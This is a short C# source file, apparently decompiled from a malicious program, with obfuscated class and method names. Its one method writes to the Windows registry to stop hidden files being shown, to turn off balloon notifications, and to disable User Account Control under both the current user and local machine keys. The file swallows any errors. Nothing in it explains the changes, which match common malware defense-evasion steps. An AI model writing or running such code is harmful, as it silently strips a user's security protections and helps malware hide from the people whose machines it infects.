using System;
using Microsoft.Win32;

namespace _2012;

internal class x0_dis
{
	public static void xdisp()
	{
		try
		{
			Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", writable: true)!.SetValue("Hidden", "2", RegistryValueKind.DWord);
		}
		catch (Exception value)
		{
			Console.WriteLine(value);
		}
		try
		{
			Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", writable: true)!.SetValue("EnableBalloonTips", "0", RegistryValueKind.DWord);
		}
		catch (Exception value2)
		{
			Console.WriteLine(value2);
		}
		try
		{
			Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true)!.SetValue("EnableLUA", "0", RegistryValueKind.DWord);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true)!.SetValue("EnableLUA", "0", RegistryValueKind.DWord);
		}
		catch (Exception value3)
		{
			Console.WriteLine(value3);
		}
	}
}
